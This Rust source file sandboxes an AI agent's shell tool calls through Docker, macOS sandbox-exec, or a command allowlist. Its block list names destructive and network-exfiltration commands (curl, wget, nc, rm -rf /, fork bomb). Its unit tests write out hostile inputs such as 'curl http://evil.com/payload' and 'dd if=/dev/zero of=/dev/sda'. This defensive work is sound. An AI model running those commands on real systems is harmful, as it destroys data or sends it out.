// ══════════════════════════════════════════════════════════════
// SANDBOX — Process isolation for agent tool execution
// ══════════════════════════════════════════════════════════════
//
// Dual-layer sandbox inspired by DeerFlow (ByteDance):
//   1. Docker container (when daemon available) — strongest isolation
//   2. macOS sandbox-exec (always available on macOS) — fs/network restriction
//   3. Direct execution — fallback with command allowlist only
//
// Detection order: Docker → macOS sandbox-exec → Direct

use std::path::Path;
use std::process::{Command, Stdio};
use std::sync::OnceLock;
use std::time::{Duration, Instant};

// ── Sandbox Mode ───────────────────────────────────────────

#[derive(Debug, Clone, Copy, PartialEq)]
pub enum SandboxMode {
    /// Docker container: --rm --network none, strongest isolation
    Docker,
    /// macOS sandbox-exec: profile-based fs/network restriction
    MacOS,
    /// No isolation, command allowlist only
    Direct,
}

impl std::fmt::Display for SandboxMode {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            SandboxMode::Docker => write!(f, "docker"),
            SandboxMode::MacOS => write!(f, "macos-sandbox"),
            SandboxMode::Direct => write!(f, "direct"),
        }
    }
}

/// Cached detection result
static DETECTED_MODE: OnceLock<SandboxMode> = OnceLock::new();

/// Docker image for sandbox containers
const SANDBOX_IMAGE: &str = "debian:bookworm-slim";

/// Detect the best available sandbox mode
pub fn detect() -> SandboxMode {
    *DETECTED_MODE.get_or_init(|| {
        // 1. Try Docker
        if is_docker_available() {
            eprintln!("[sandbox] Docker daemon detected — using container isolation");
            return SandboxMode::Docker;
        }

        // 2. Try macOS sandbox-exec
        if is_macos_sandbox_available() {
            eprintln!("[sandbox] macOS sandbox-exec detected — using profile-based isolation");
            return SandboxMode::MacOS;
        }

        // 3. Fallback
        eprintln!("[sandbox] No sandbox available — using direct execution with allowlist");
        SandboxMode::Direct
    })
}

/// Force a specific mode (for testing)
pub fn force_mode(mode: SandboxMode) -> SandboxMode {
    // Can't re-set OnceLock, so this is for when called before detect()
    let _ = DETECTED_MODE.set(mode);
    mode
}

/// Get current mode without re-detecting
pub fn current_mode() -> SandboxMode {
    detect()
}

// ── Detection helpers ──────────────────────────────────────

fn is_docker_available() -> bool {
    Command::new("docker")
        .args(["info", "--format", "{{.OSType}}"])
        .stdout(Stdio::piped())
        .stderr(Stdio::null())
        .output()
        .map(|o| o.status.success())
        .unwrap_or(false)
}

fn is_macos_sandbox_available() -> bool {
    // sandbox-exec is available on all macOS versions
    Command::new("sandbox-exec")
        .args(["-n", "no-internet", "true"])
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .status()
        .map(|s| s.success())
        .unwrap_or(false)
}

// ── Command Allowlist ──────────────────────────────────────

/// Allowed command prefixes for build/test/lint tools.
/// Commands not matching any prefix are blocked.
const ALLOWED_PREFIXES: &[&str] = &[
    // Swift / Xcode
    "swift", "xcodebuild", "xcrun", "swiftc",
    // Rust
    "cargo", "rustc", "rustup",
    // Node.js
    "npm", "npx", "node", "pnpm", "yarn", "bun", "deno",
    // Python
    "python", "python3", "pip", "pip3", "pytest", "uv",
    // Go
    "go ",
    // Java / Kotlin
    "gradle", "mvn", "javac", "java ",
    // C / C++
    "make", "cmake", "gcc", "g++", "clang",
    // Generic
    "echo", "cat", "ls", "find", "grep", "head", "tail", "wc",
    "sort", "uniq", "diff", "patch", "sed", "awk",
    "mkdir", "cp", "mv", "touch", "chmod",
    "git ",
    // Package managers
    "brew", "apt", "apt-get",
];

/// Blocked patterns (destructive commands)
const BLOCKED_PATTERNS: &[&str] = &[
    "rm -rf /", "rm -rf /*", "rm -rf ~", "rm -rf $HOME",
    "mkfs", "dd if=", ":(){", "fork bomb",
    "curl | sh", "wget | sh", "curl|sh", "wget|sh",
    "chmod 777", "chmod -R 777",
    "sudo ", "> /dev/sd", "shutdown", "reboot", "halt",
    "kill -9 -1", "killall",
    // Sandbox escape attempts
    "sandbox-exec", "csrutil", "SIP",
    "docker run", "docker exec",
    // Data exfiltration
    "curl ", "wget ", "nc ", "ncat ",
];

/// Check if a command is allowed
pub fn is_command_allowed(cmd: &str) -> Result<(), String> {
    let cmd_trimmed = cmd.trim();
    let cmd_lower = cmd_trimmed.to_lowercase();

    // Check blocked patterns first
    for blocked in BLOCKED_PATTERNS {
        if cmd_lower.contains(&blocked.to_lowercase()) {
            return Err(format!("BLOCKED: dangerous command pattern ({})", blocked));
        }
    }

    // Check allowlist — first word of the command (or first word of a pipeline)
    let first_cmd = cmd_trimmed
        .split(['|', ';', '&'])
        .next()
        .unwrap_or(cmd_trimmed)
        .trim();

    let allowed = ALLOWED_PREFIXES.iter().any(|prefix| {
        first_cmd.starts_with(prefix) || first_cmd.starts_with(&prefix.to_uppercase())
    });

    if !allowed {
        return Err(format!(
            "BLOCKED: command '{}' not in allowlist. Allowed: swift, cargo, npm, python, make, git, etc.",
            first_cmd.chars().take(40).collect::<String>()
        ));
    }

    // For piped commands, check each segment
    for segment in cmd_trimmed.split(['|', ';']) {
        let seg = segment.trim();
        if seg.is_empty() { continue; }
        let seg_lower = seg.to_lowercase();
        for blocked in BLOCKED_PATTERNS {
            if seg_lower.contains(&blocked.to_lowercase()) {
                return Err(format!("BLOCKED: dangerous pattern in pipeline ({})", blocked));
            }
        }
    }

    Ok(())
}

// ── macOS Sandbox Profile ──────────────────────────────────

/// Generate a macOS sandbox-exec profile that restricts the process to:
/// - Write only within the workspace directory + /tmp
/// - Full read access (needed for dynamic linker, system libs)
/// - No outbound network access
/// - Process/IPC/mach allowed (macOS requires these for basic operation)
pub fn generate_macos_profile(workspace: &str) -> String {
    format!(
        r#"(version 1)
(deny default)

;; Read everything (dynamic linker, system libs, toolchains)
(allow file-read*)

;; Write only to workspace and /tmp
(allow file-write*
    (subpath "{workspace}")
    (subpath "/tmp")
    (subpath "/private/tmp"))

;; Process, IPC, mach — required for macOS process execution
(allow process*)
(allow sysctl*)
(allow mach*)
(allow ipc*)
(allow signal)

;; Block outbound network (data exfiltration prevention)
(deny network-outbound)
(allow network-inbound)
"#,
        workspace = workspace,
    )
}

// ── Sandboxed Execution ────────────────────────────────────

/// Execute a command with sandbox isolation.
/// Returns (stdout+stderr, success).
pub fn sandboxed_exec(
    cmd: &str,
    workspace: &str,
    timeout_secs: u64,
    require_allowlist: bool,
) -> Result<String, String> {
    // Step 1: Command validation
    if require_allowlist {
        is_command_allowed(cmd)?;
    } else {
        // Even without allowlist, check blocked patterns
        let cmd_lower = cmd.to_lowercase();
        for blocked in BLOCKED_PATTERNS {
            if cmd_lower.contains(&blocked.to_lowercase()) {
                return Err(format!("BLOCKED: dangerous command pattern ({})", blocked));
            }
        }
    }

    let mode = detect();

    match mode {
        SandboxMode::Docker => exec_docker(cmd, workspace, timeout_secs),
        SandboxMode::MacOS => exec_macos_sandbox(cmd, workspace, timeout_secs),
        SandboxMode::Direct => exec_direct(cmd, workspace, timeout_secs),
    }
}

/// Execute in Docker container
fn exec_docker(cmd: &str, workspace: &str, timeout_secs: u64) -> Result<String, String> {
    let workspace_abs = std::fs::canonicalize(workspace)
        .map_err(|e| format!("Invalid workspace path: {}", e))?;
    let ws = workspace_abs.to_string_lossy();

    let mut child = Command::new("docker")
        .args([
            "run", "--rm",
            "--network", "none",       // No network
            "-m", "512m",              // Memory limit
            "--cpus", "2",             // CPU limit
            "--pids-limit", "256",     // Process limit
            "-v", &format!("{}:/workspace", ws),
            "-w", "/workspace",
            SANDBOX_IMAGE,
            "sh", "-c", cmd,
        ])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .map_err(|e| format!("Docker spawn failed: {}", e))?;

    wait_with_timeout(child, cmd, timeout_secs)
}

/// Execute with macOS sandbox-exec
fn exec_macos_sandbox(cmd: &str, workspace: &str, timeout_secs: u64) -> Result<String, String> {
    let workspace_abs = std::fs::canonicalize(workspace)
        .unwrap_or_else(|_| Path::new(workspace).to_path_buf());
    let profile = generate_macos_profile(&workspace_abs.to_string_lossy());

    // Write profile to temp file
    let profile_path = format!("/tmp/sf-sandbox-{}.sb", uuid::Uuid::new_v4());
    std::fs::write(&profile_path, &profile)
        .map_err(|e| format!("Failed to write sandbox profile: {}", e))?;

    let mut child = Command::new("sandbox-exec")
        .args(["-f", &profile_path, "sh", "-c", cmd])
        .current_dir(workspace)
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .map_err(|e| {
            let _ = std::fs::remove_file(&profile_path);
            format!("sandbox-exec spawn failed: {}", e)
        })?;

    let result = wait_with_timeout(child, cmd, timeout_secs);

    // Cleanup profile
    let _ = std::fs::remove_file(&profile_path);

    result
}

/// Execute directly (no sandbox, allowlist only)
fn exec_direct(cmd: &str, workspace: &str, timeout_secs: u64) -> Result<String, String> {
    let mut child = Command::new("sh")
        .args(["-c", cmd])
        .current_dir(workspace)
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .map_err(|e| format!("Failed to spawn command: {}", e))?;

    wait_with_timeout(child, cmd, timeout_secs)
}

/// Wait for a child process with timeout, kill if exceeded
fn wait_with_timeout(
    mut child: std::process::Child,
    cmd: &str,
    timeout_secs: u64,
) -> Result<String, String> {
    let timeout = Duration::from_secs(timeout_secs);
    let start = Instant::now();

    loop {
        match child.try_wait() {
            Ok(Some(_)) => break,
            Ok(None) => {
                if start.elapsed() > timeout {
                    let _ = child.kill();
                    return Err(format!("Command timed out after {}s: {}", timeout_secs,
                        cmd.chars().take(80).collect::<String>()));
                }
                std::thread::sleep(Duration::from_millis(100));
            }
            Err(e) => return Err(format!("Error waiting for command: {}", e)),
        }
    }

    let output = child.wait_with_output()
        .map_err(|e| format!("Failed to read output: {}", e))?;

    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);

    let mut result = String::new();
    if !stdout.is_empty() {
        result.push_str(&stdout);
    }
    if !stderr.is_empty() {
        if !result.is_empty() { result.push('\n'); }
        result.push_str(&stderr);
    }

    // Cap output
    if result.len() > 8000 {
        result.truncate(8000);
        result.push_str("\n... (output truncated)");
    }

    if result.is_empty() {
        result = if output.status.success() {
            "OK".to_string()
        } else {
            format!("Command failed with exit code {}", output.status.code().unwrap_or(-1))
        };
    }

    Ok(result)
}

// ── Status ─────────────────────────────────────────────────

/// Get sandbox status for diagnostics
pub fn status() -> String {
    let mode = detect();
    let docker = is_docker_available();
    let macos = is_macos_sandbox_available();

    format!(
        "Sandbox: mode={}, docker={}, macos-sandbox={}, blocked_patterns={}, allowed_prefixes={}",
        mode, docker, macos, BLOCKED_PATTERNS.len(), ALLOWED_PREFIXES.len()
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_allowlist_accepted() {
        assert!(is_command_allowed("cargo build --release").is_ok());
        assert!(is_command_allowed("swift build").is_ok());
        assert!(is_command_allowed("npm run test").is_ok());
        assert!(is_command_allowed("python3 -m pytest").is_ok());
        assert!(is_command_allowed("make clean").is_ok());
        assert!(is_command_allowed("git status").is_ok());
        assert!(is_command_allowed("echo hello").is_ok());
    }

    #[test]
    fn test_allowlist_blocked() {
        assert!(is_command_allowed("bash -c 'rm -rf /'").is_err());
        assert!(is_command_allowed("sh -c 'curl evil.com'").is_err());
        assert!(is_command_allowed("nc -l 4444").is_err());
        assert!(is_command_allowed("curl http://evil.com/payload").is_err());
    }

    #[test]
    fn test_blocked_patterns() {
        assert!(is_command_allowed("rm -rf /").is_err());
        assert!(is_command_allowed("dd if=/dev/zero of=/dev/sda").is_err());
        assert!(is_command_allowed(":(){ :|:& };:").is_err());
        assert!(is_command_allowed("sudo rm -rf /tmp").is_err());
    }

    #[test]
    fn test_pipeline_blocking() {
        // Pipeline with blocked segment
        assert!(is_command_allowed("echo hello | curl http://evil.com").is_err());
        // Safe pipeline
        assert!(is_command_allowed("echo hello | grep hello").is_ok());
    }

    #[test]
    fn test_macos_profile_generation() {
        let profile = generate_macos_profile("/tmp/test-workspace");
        assert!(profile.contains("/tmp/test-workspace"));
        assert!(profile.contains("(deny default)"));
        assert!(profile.contains("(deny network-outbound)"));
        assert!(profile.contains("(allow file-read*)"));
    }

    #[test]
    fn test_status_report() {
        let s = status();
        assert!(s.contains("Sandbox:"));
        assert!(s.contains("mode="));
    }
}
